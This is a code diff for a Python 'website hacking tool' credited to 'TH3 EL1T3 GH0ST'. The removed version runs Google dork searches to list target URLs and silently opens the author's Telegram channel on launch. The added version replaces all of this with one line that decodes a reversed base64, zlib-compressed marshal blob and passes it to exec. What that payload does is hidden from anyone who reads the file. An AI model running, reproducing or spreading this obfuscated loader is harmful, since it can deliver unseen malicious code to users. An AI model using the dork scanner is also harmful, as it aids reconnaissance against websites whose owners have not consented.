@@ -1,81 +1,11 @@
-import random
-import os
-import time
-import sys
-from googlesearch import search
-import urllib.error
+#____________________________
+#______GHOST______
+#____________________________
+#ENCRYPTED : TH3 EL1T3 GH0ST (AR1Y4N)
+#Facebook : GHOST-ATTACK
+#GitHub : TH3-EL1T3-GH0ST
+#Telegram : TH3 EL1T3 GH0ST OFFICIAL
+#____________________________
 
-# Banner/Logo
-logo = """
-      \033[1;104mTHIS TOOLS IS EDUCATIONAL PURPOSES ONLY\033[0;37m     
-\033[1;36m           WELCOME TO GHOST WORLD🌎💀
-\033[31;1m╔══════════════════════════════════════════════╗
-\033[31;1m║\033[32;1m  ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗\033[31;1m  ║
-\033[31;1m║\033[32;1m ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝\033[31;1m  ║
-\033[31;1m║\033[32;1m ██║  ███╗███████║██║   ██║███████╗   ██║\033[31;1m     ║
-\033[31;1m║\033[32;1m ██║   ██║██╔══██║██║   ██║╚════██║   ██║\033[31;1m     ║
-\033[31;1m║\033[32;1m  ██████╔╝██║  ██║╚██████╔╝███████║   ██║\033[1;37mV.6.9\033[31;1m║
-\033[31;1m║\033[32;1m  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝\033[31;1m     ║
-\033[31;1m║\033[32;1m   \033[1;36m[\033[1;34m!\033[1;36m]  \033[1;35mTOOLS CREATE BY TH3 EL1T3 GH0ST \033[31;1m      ║
-\033[31;1m╚══════════════════════════════════════════════╝
-\033[1;36m  Tools Name : GHOST WEBSITE HACKING TOOLS
-\033[1;37m             TYPE :  GIFT
- \033[1;33m# Telegram: https://t.me/TH3EL1T3GH0STOFFICIAL
-\033[1;34m           Coding By: @TH3EL1T3GH0ST
-\033[1;35m═══════════════════════════════════════════════
-"""
 
-# Function to log results
-def logger(filename, data):
-    with open(filename + ".txt", "a") as file:
-        file.write(str(data) + "\n")
-os.system('clear')
-os.system('xdg-open https://t.me/TH3EL1T3GH0STOFFICIAL')
-def main():
-    print(logo)
-    try:
-        # Prompt to save the project
-        resultdork = input("\033[32;1m Would you want to save the project? Y/N: ").strip().lower()
-        loges = ""
-
-        if resultdork == "y":
-            loges = input("Enter the name for the log file: ").strip()
-        else:
-            print("Skipped saving the project.")
-
-        # Collecting search inputs
-        dork = input("\033[1;34m\nEnter Dork: ").strip()
-        numr = input("Number of Results (1-100): ").strip()
-
-        try:
-            requ = 0
-            counter = 0
-
-            print("\033[1;36m\nStarting search...\n")
-            for results in search(dork, tld="com", lang="en", num=int(numr), start=0, stop=None, pause=2):
-                rand_user = random.choice(["Mozilla/5.0", "Chrome/91.0"])  # Example user agents
-                counter += 1
-                print(f" \033[31;1m[{counter}] : \033[1;36m{results} \033[32;1m<Found ")
-                time.sleep(0.5)
-                requ += 1
-
-                # Save results to log if opted
-                if loges:
-                    logger(loges, results)
-
-                if requ >= int(numr):
-                    break
-
-        except urllib.error.HTTPError as e:
-            if e.code == 429:
-                print("[Error 429] Too many requests. Please try again later.")
-                sys.exit()
-
-        print("\nSearch Completed.")
-        print("\t\t\tTH3 EL1T3 GH0ST\n")
-    except KeyboardInterrupt:
-        print("\n\nInterrupt detected. Exiting program.")
-        sys.exit()
-
-if __name__ == "__main__":
-    main()
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'==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'))
